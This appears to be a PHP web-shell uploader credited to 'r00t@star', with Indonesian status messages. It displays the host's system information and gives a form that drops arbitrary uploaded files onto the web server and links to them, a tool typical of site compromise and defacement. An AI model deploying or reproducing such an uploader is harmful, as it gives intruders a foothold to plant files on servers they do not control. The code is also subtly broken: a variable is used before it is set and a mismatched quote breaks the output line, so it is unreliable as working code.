<?php
echo "
<style>
@import url('https://fonts.googleapis.com/css?family=Iceberg|Lobster|Ranga');
html,body {
      background-color: white;
      font-family: 'Lobster', Ranga;
      text-align: center;
  }
</style>
Recode by r00t@star<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
    $files = $_FILES['idx_file']['name'];
    $web = "http://".$_SERVER['HTTP_HOST']."/";
    echo "Sukses Upload => <a href='".$web.$files."' style='color: red; font-family: Iceberg;" target='_blank'>".$web.$files."</a>";
		} else {
			echo "<script> alert('gagal upload >:(');</script>";
		}
?>
